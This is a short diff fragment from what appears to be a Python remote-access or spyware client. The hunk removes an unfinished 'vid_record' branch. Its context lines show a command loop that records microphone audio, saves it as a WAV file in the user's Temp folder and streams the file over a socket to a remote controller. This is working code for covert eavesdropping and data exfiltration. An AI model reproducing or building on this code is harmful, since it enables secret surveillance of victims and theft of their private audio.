@@ -52,6 +52,3 @@ while True:
         write(f"{os.environ['USERPROFILE']}\\\AppData\\Local\\Temp\\aud0.wav", frames, record)
         with open(f"{os.environ['USERPROFILE']}\\\AppData\\Local\\Temp\\aud0.wav", 'rb') as f:
             for l in f: s.sendall(l)
-    elif Handler_DATA == "vid_record":
-        pass
-        # Unfinished Code.
